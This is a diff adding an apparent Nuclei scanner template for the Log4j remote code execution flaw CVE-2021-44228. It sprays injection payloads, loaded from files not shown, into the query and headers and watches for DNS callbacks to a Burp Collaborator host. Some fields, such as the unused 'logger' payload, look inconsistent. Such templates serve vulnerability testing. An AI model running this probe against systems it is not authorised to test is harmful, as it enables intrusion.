@@ -1,0 +1,39 @@
+id: Log4j
+
+info:
+  name: Log4j RCE
+  author: zy9ard3
+  severity: Critical
+  description: CVE-2021-44228
+  reference:
+    - https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
+    - https://www.lunasec.io/docs/blog/log4j-zero-day/
+    - https://gist.github.com/bugbountynights/dde69038573db1c12705edb39f9a704a
+  tags: CVE-2021-44228,Log4j
+
+requests:
+  - raw:
+      - |
+        GET /?q=§payload§ HTTP/1.1
+        Host: {{Hostname}}
+        §header§: §payload§
+
+    payloads:
+      logger:
+        - xxxx.burpcollab.net
+      header: headers.txt
+      payload: payloads.txt
+    attack: clusterbomb
+
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: burpcollaborator 
+        words:
+          - "dns"
+
+      - type: regex
+        part: burpcollaborator
+        regex:
+          - '([a-z0-9\.\-]+)\.([a-z0-9]+)'
